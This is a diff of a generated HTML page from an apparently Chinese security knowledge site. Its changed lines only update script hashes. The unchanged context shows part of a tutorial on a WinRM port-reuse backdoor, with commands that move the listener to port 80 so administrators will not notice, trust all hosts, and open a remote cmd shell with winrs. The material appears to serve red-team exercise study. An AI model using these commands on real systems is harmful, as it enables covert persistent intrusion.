@@ -14,10 +14,10 @@
     </script>
     
     <!--loadable-components prefetch  -->
-    <link data-chunk="app" rel="preload" as="script" href="/assets/js/app.ceaffbcc.js">
-<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/vendors~LayoutWrapper.ceaffbcc.js">
-<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/LayoutWrapper.ceaffbcc.js">
-<link data-chunk="knowledge/hw/net-proxy.md" rel="preload" as="script" href="/assets/js/knowledge/hw/net-proxy.md.ceaffbcc.js"> 
+    <link data-chunk="app" rel="preload" as="script" href="/assets/js/app.5d90b578.js">
+<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/vendors~LayoutWrapper.5d90b578.js">
+<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/LayoutWrapper.5d90b578.js">
+<link data-chunk="knowledge/hw/net-proxy.md" rel="preload" as="script" href="/assets/js/knowledge/hw/net-proxy.md.5d90b578.js"> 
     <style>pre[class*="language-"].line-numbers {
 	position: relative;
 	padding-left: 3.8em;
@@ -26562,10 +26562,10 @@ winrm e winrm/config/Listener	<span class="token comment">#查看80端口的List
 netsh http show servicestate	<span class="token comment">#查看是否新增了url前缀</span></code></pre></div><p><strong>3、Server 2008配置，修改WinRM端口</strong></p><p>对于原本未开放WinRM服务的机器（Server 2008），需要把新开的<strong>5985</strong>端口修改至80端口，避免引起系统管理员怀疑</p><div class="rcpress-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">winrm <span class="token builtin class-name">set</span> winrm/config/Listener?Address<span class="token operator">=</span>*+Transport<span class="token operator">=</span>HTTP @<span class="token punctuation">{</span>Port<span class="token operator">=</span><span class="token string">&quot;80&quot;</span><span class="token punctuation">}</span></code></pre></div><p><strong>4、后门连接</strong></p><p> 首先开启本机WinRM服务，然后设置信任连接的主机 </p><div class="rcpress-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">winrm quickconfig -q 	<span class="token comment"># 开启服务</span>
 winrm <span class="token builtin class-name">set</span> winrm/config/Client @<span class="token punctuation">{</span>TrustedHosts<span class="token operator">=</span><span class="token string">&quot;*&quot;</span><span class="token punctuation">}</span>  <span class="token comment"># 设置信任连接的主机</span></code></pre></div><p> 执行使用winrs命令连接远程WinRM服务，获取交互shell</p><div class="rcpress-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd</code></pre></div><hr/><p>端口复用相关工具： <a href="https://github.com/Heart-Sky/port-multiplexing" target="_blank">https://github.com/Heart-Sky/port-multiplexing</a> </p><h1 class="__internal" id="参考连接">参考连接<a href="#%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5" aria-hidden="true" class="anchor">#</a></h1><p> <a href="https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8" target="_blank">端口复用后门 - 0x4D75 - 博客园</a> </p></section><section class="prev-next-nav"></section></article></div></div></div></div></div></div></div>
      <!--loadable-components render area  -->
-    <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json">[48,0,24]</script>
-<script async data-chunk="app" src="/assets/js/app.ceaffbcc.js"></script>
-<script async data-chunk="LayoutWrapper" src="/assets/js/vendors~LayoutWrapper.ceaffbcc.js"></script>
-<script async data-chunk="LayoutWrapper" src="/assets/js/LayoutWrapper.ceaffbcc.js"></script>
-<script async data-chunk="knowledge/hw/net-proxy.md" src="/assets/js/knowledge/hw/net-proxy.md.ceaffbcc.js"></script>
+    <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json">[50,0,26]</script>
+<script async data-chunk="app" src="/assets/js/app.5d90b578.js"></script>
+<script async data-chunk="LayoutWrapper" src="/assets/js/vendors~LayoutWrapper.5d90b578.js"></script>
+<script async data-chunk="LayoutWrapper" src="/assets/js/LayoutWrapper.5d90b578.js"></script>
+<script async data-chunk="knowledge/hw/net-proxy.md" src="/assets/js/knowledge/hw/net-proxy.md.5d90b578.js"></script>
   </body>
 </html>
